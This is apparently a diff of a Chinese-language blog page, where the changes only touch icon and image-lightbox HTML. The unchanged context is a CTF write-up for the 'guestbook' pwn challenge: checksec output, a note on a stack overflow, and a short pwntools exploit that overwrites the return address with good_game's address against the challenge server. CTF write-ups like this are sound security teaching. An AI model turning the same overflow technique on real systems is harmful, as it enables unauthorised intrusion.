@@ -123,7 +123,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -217,16 +217,44 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec --file guestbook</span><br><span class="line">[*] &#39;&#x2F;Users&#x2F;miao&#x2F;&#x2F;CTF&#x2F;PWN&#x2F;guestbook&#x2F;guestbook&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
 
 <h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>直接IDA F5，可以看到一个明显的溢出，并且有一个good_game函数</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051401.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051401.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>good_game函数功能为读取flag</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051402.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051402.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>那就很明显了，通过溢出修改返回地址为good_game,读取flag</p>
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>gdb确认信息及good_game地址</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051403.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051403.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>构造exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./guestbook'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9876</span>)</span><br><span class="line"><span class="comment"># sh = process('./guestbook')</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">good_game_addr = elf.symbols[<span class="string">"good_game"</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">0x88</span></span><br><span class="line">payload += p64(good_game_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051404.jpg" alt=""></p>
+<h2 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019051404.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 
         </div>
 
